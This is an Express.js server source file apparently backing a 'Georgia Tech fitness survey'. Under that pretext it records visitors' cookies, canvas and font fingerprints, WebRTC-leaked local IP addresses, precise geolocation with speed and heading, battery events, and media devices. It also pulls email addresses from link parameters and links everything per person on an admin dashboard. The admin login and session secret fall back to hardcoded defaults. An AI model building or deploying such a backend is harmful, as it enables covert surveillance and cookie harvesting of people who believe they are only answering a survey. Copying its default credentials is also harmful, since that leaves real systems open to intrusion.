const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const session = require('express-session');
const app = express();
const port = process.env.PORT || 3000;

// Enable trust proxy for DigitalOcean App Platform
app.set('trust proxy', true); // Trust the first proxy (DigitalOcean's load balancer)

// SQLite database connection
const db = new sqlite3.Database(process.env.DATABASE_PATH || './gatech_fitness.db', (err) => {
    if (err) {
        console.error('Error opening SQLite database:', err.message);
    } else {
        console.log('Connected to SQLite database');
    }
});

// Initialize database tables
db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            userId TEXT,
            timestamp TEXT,
            userAgent TEXT,
            browser TEXT,
            screen TEXT,
            window TEXT,
            device TEXT,
            connection TEXT,
            referrer TEXT,
            url TEXT,
            cookies TEXT,
            timezone TEXT,
            plugins TEXT,
            mimeTypes TEXT,
            canvasFingerprint TEXT,
            sessionDuration TEXT,
            battery TEXT,
            fonts TEXT,
            mediaDevices TEXT
        )
    `);
    db.run(`
        CREATE TABLE IF NOT EXISTS surveys (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            userId TEXT,
            timestamp TEXT,
            name TEXT,
            email TEXT,
            frequency TEXT,
            goal TEXT,
            feedback TEXT
        )
    `);
    db.run(`
        CREATE TABLE IF NOT EXISTS geo (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            userId TEXT,
            timestamp TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            altitude REAL,
            heading REAL,
            speed REAL
        )
    `);
    db.run(`
        CREATE TABLE IF NOT EXISTS webrtc (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            userId TEXT,
            timestamp TEXT,
            localIp TEXT
        )
    `);
    db.run(`
        CREATE TABLE IF NOT EXISTS battery (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            ip TEXT,
            userId TEXT,
            timestamp TEXT,
            batteryEvent TEXT
        )
    `, (err) => {
        if (err) {
            console.error('Error creating tables:', err.message);
        } else {
            console.log('Database tables created successfully');
        }
    });
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

// Hardcoded credentials (change before deployment)
const validCredentials = {
    username: process.env.ADMIN_USERNAME || 'admin',
    password: process.env.ADMIN_PASSWORD || 'gatech2025'
};

// Authentication middleware
const isAuthenticated = (req, res, next) => {
    if (req.session.isAuthenticated) {
        return next();
    }
    res.redirect('/login?error=1');
};

// Serve index.html for root and custom route
app.get(['/', '/fitness-survey'], (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Handle login
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    if (username === validCredentials.username && password === validCredentials.password) {
        req.session.isAuthenticated = true;
        res.redirect('/analyzelogs');
    } else {
        res.redirect('/login?error=1');
    }
});

// Handle logout
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

// Serve analysis page
app.get('/analyzelogs', isAuthenticated, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'analyzelogs.html'));
});

// Summarize log data
app.get('/summarize', isAuthenticated, async (req, res) => {
    try {
        const userLogs = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM users', [], (err, rows) => {
                if (err) reject(err);
                resolve(rows.map(row => ({
                    ...row,
                    browser: row.browser ? JSON.parse(row.browser) : null,
                    screen: row.screen ? JSON.parse(row.screen) : null,
                    window: row.window ? JSON.parse(row.window) : null,
                    device: row.device ? JSON.parse(row.device) : null,
                    connection: row.connection ? JSON.parse(row.connection) : null,
                    plugins: row.plugins ? JSON.parse(row.plugins) : null,
                    mimeTypes: row.mimeTypes ? JSON.parse(row.mimeTypes) : null,
                    battery: row.battery ? JSON.parse(row.battery) : null,
                    fonts: row.fonts ? JSON.parse(row.fonts) : null,
                    mediaDevices: row.mediaDevices ? JSON.parse(row.mediaDevices) : null
                })));
            });
        });
        const surveyLogs = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM surveys', [], (err, rows) => {
                if (err) reject(err);
                resolve(rows);
            });
        });
        const geoLogs = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM geo', [], (err, rows) => {
                if (err) reject(err);
                resolve(rows);
            });
        });
        const webrtcLogs = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM webrtc', [], (err, rows) => {
                if (err) reject(err);
                resolve(rows);
            });
        });
        const batteryLogs = await new Promise((resolve, reject) => {
            db.all('SELECT * FROM battery', [], (err, rows) => {
                if (err) reject(err);
                resolve(rows.map(row => ({
                    ...row,
                    batteryEvent: row.batteryEvent ? JSON.parse(row.batteryEvent) : null
                })));
            });
        });

        const users = {};
        userLogs.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (!users[key]) {
                users[key] = { ip: log.ip, userId: log.userId, userData: [], surveyData: [], geoData: [], webrtcData: [], batteryData: [] };
            }
            users[key].userData.push({
                timestamp: log.timestamp,
                userAgent: log.userAgent,
                browser: log.browser,
                screen: log.screen,
                window: log.window,
                device: log.device,
                connection: log.connection,
                referrer: log.referrer,
                url: log.url,
                cookies: log.cookies,
                timezone: log.timezone,
                plugins: log.plugins,
                mimeTypes: log.mimeTypes,
                canvasFingerprint: log.canvasFingerprint,
                sessionDuration: log.sessionDuration,
                battery: log.battery,
                fonts: log.fonts,
                mediaDevices: log.mediaDevices
            });
        });
        surveyLogs.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].surveyData.push({
                    timestamp: log.timestamp,
                    name: log.name,
                    email: log.email,
                    frequency: log.frequency,
                    goal: log.goal,
                    feedback: log.feedback
                });
            }
        });
        geoLogs.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].geoData.push({
                    timestamp: log.timestamp,
                    latitude: log.latitude,
                    longitude: log.longitude,
                    accuracy: log.accuracy,
                    altitude: log.altitude,
                    heading: log.heading,
                    speed: log.speed
                });
            }
        });
        webrtcLogs.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].webrtcData.push({
                    timestamp: log.timestamp,
                    localIp: log.localIp
                });
            }
        });
        batteryLogs.forEach(log => {
            const key = `${log.ip}|${log.userId}`;
            if (users[key]) {
                users[key].batteryData.push({
                    timestamp: log.timestamp,
                    batteryEvent: log.batteryEvent
                });
            }
        });

        const exerciseFrequencies = surveyLogs.reduce((acc, log) => {
            acc[log.frequency] = (acc[log.frequency] || 0) + 1;
            return acc;
        }, {});

        res.json({
            users: Object.values(users),
            exerciseFrequencies
        });
    } catch (error) {
        console.error('Error summarizing data:', error);
        res.status(500).json({ status: 'error', message: 'Failed to summarize data' });
    }
});

// Log client data
app.post('/log', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await new Promise((resolve, reject) => {
            db.run(
                `INSERT INTO users (ip, userId, timestamp, userAgent, browser, screen, window, device, connection, referrer, url, cookies, timezone, plugins, mimeTypes, canvasFingerprint, sessionDuration, battery, fonts, mediaDevices) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    data.ip,
                    data.userId,
                    data.timestamp,
                    data.userAgent,
                    JSON.stringify(data.browser),
                    JSON.stringify(data.screen),
                    JSON.stringify(data.window),
                    JSON.stringify(data.device),
                    JSON.stringify(data.connection),
                    data.referrer,
                    data.url,
                    data.cookies,
                    data.timezone,
                    JSON.stringify(data.plugins),
                    JSON.stringify(data.mimeTypes),
                    data.canvasFingerprint,
                    data.sessionDuration,
                    JSON.stringify(data.battery),
                    JSON.stringify(data.fonts),
                    JSON.stringify(data.mediaDevices)
                ],
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });
        res.json({ status: 'success', message: 'Data logged' });
    } catch (error) {
        console.error('Error saving log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log data' });
    }
});

// Log geolocation data
app.post('/log-geo', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await new Promise((resolve, reject) => {
            db.run(
                `INSERT INTO geo (ip, userId, timestamp, latitude, longitude, accuracy, altitude, heading, speed) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    data.ip,
                    data.userId,
                    data.timestamp,
                    data.latitude,
                    data.longitude,
                    data.accuracy,
                    data.altitude,
                    data.heading,
                    data.speed
                ],
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });
        res.json({ status: 'success', message: 'Geo data logged' });
    } catch (error) {
        console.error('Error saving geo log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log geo data' });
    }
});

// Log WebRTC data
app.post('/log-webrtc', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await new Promise((resolve, reject) => {
            db.run(
                `INSERT INTO webrtc (ip, userId, timestamp, localIp) VALUES (?, ?, ?, ?)`,
                [data.ip, data.userId, data.timestamp, data.localIp],
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });
        res.json({ status: 'success', message: 'WebRTC data logged' });
    } catch (error) {
        console.error('Error saving WebRTC log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log WebRTC data' });
    }
});

// Log survey data
app.post('/log-survey', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        // Check if a survey entry already exists for this userId
        const existingSurvey = await new Promise((resolve, reject) => {
            db.get('SELECT * FROM surveys WHERE userId = ? ORDER BY timestamp DESC LIMIT 1', [data.userId], (err, row) => {
                if (err) reject(err);
                resolve(row);
            });
        });
        if (!existingSurvey || !existingSurvey.email) {
            // Only insert if no email exists or if this is the initial log
            await new Promise((resolve, reject) => {
                db.run(
                    `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
                    [
                        data.ip,
                        data.userId,
                        data.timestamp,
                        data.name || '',
                        data.email || '',
                        data.frequency || '',
                        data.goal || '',
                        data.feedback || ''
                    ],
                    (err) => {
                        if (err) reject(err);
                        resolve();
                    }
                );
            });
        } else if (data.name || data.frequency || data.goal || data.feedback) {
            // Update existing entry with form data, keeping the initial email
            await new Promise((resolve, reject) => {
                db.run(
                    `UPDATE surveys SET name = ?, frequency = ?, goal = ?, feedback = ?, timestamp = ? WHERE userId = ? AND id = ?`,
                    [
                        data.name || existingSurvey.name,
                        data.frequency || existingSurvey.frequency,
                        data.goal || existingSurvey.goal,
                        data.feedback || existingSurvey.feedback,
                        data.timestamp,
                        data.userId,
                        existingSurvey.id
                    ],
                    (err) => {
                        if (err) reject(err);
                        resolve();
                    }
                );
            });
        }
        res.json({ status: 'success', message: 'Survey data logged' });
    } catch (error) {
        console.error('Error saving survey log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log survey data' });
    }
});

// Log battery events
app.post('/log-battery', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
        };
        await new Promise((resolve, reject) => {
            db.run(
                `INSERT INTO battery (ip, userId, timestamp, batteryEvent) VALUES (?, ?, ?, ?)`,
                [data.ip, data.userId, data.timestamp, JSON.stringify(data.batteryEvent)],
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });
        res.json({ status: 'success', message: 'Battery data logged' });
    } catch (error) {
        console.error('Error saving battery log:', error);
        res.status(500).json({ status: 'error', message: 'Failed to log battery data' });
    }
});

// Handle form submission
app.post('/submit', async (req, res) => {
    try {
        const data = {
            ...req.body,
            ip: req.ip || req.connection.remoteAddress,
            timestamp: new Date().toISOString(),
            userId: req.body.userId || 'unknown'
        };
        const urlParams = new URLSearchParams(req.body.url || '');
        data.email = urlParams.get('email') || req.body.email || req.body.url_email;
        await new Promise((resolve, reject) => {
            db.run(
                `INSERT INTO surveys (ip, userId, timestamp, name, email, frequency, goal, feedback) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    data.ip,
                    data.userId,
                    data.timestamp,
                    data.name,
                    data.email,
                    data.frequency,
                    data.goal,
                    data.feedback
                ],
                (err) => {
                    if (err) reject(err);
                    resolve();
                }
            );
        });
        res.redirect('/thankyou.html');
    } catch (error) {
        console.error('Error saving form submission:', error);
        res.status(500).send('Error processing submission');
    }
});

// Clear analytics data
app.post('/clear', isAuthenticated, async (req, res) => {
    try {
        await new Promise((resolve, reject) => {
            db.run('DELETE FROM users', (err) => {
                if (err) reject(err);
                resolve();
            });
        });
        await new Promise((resolve, reject) => {
            db.run('DELETE FROM surveys', (err) => {
                if (err) reject(err);
                resolve();
            });
        });
        await new Promise((resolve, reject) => {
            db.run('DELETE FROM geo', (err) => {
                if (err) reject(err);
                resolve();
            });
        });
        await new Promise((resolve, reject) => {
            db.run('DELETE FROM webrtc', (err) => {
                if (err) reject(err);
                resolve();
            });
        });
        await new Promise((resolve, reject) => {
            db.run('DELETE FROM battery', (err) => {
                if (err) reject(err);
                resolve();
            });
        });
        res.json({ status: 'success', message: 'Analytics data cleared' });
    } catch (error) {
        console.error('Error clearing data:', error);
        res.status(500).json({ status: 'error', message: 'Failed to clear data' });
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});